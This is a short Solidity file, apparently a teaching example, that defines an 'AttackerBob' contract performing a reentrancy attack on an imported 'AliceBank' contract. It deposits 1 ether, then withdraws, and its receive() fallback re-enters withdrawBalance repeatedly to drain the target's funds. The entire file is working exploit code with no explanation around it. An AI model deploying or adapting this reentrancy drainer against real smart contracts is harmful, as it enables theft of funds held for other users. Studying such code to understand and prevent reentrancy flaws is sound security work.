// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8; 
import "./AliceBank.sol";

contract AttackerBob {
    AliceBank target;

    constructor(address _target) {
        target = AliceBank(payable(_target));
    }

    function attack() public payable {
        target.deposit{value: 1 ether}();
        target.withdrawBalance();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawBalance();
        }
    }
}
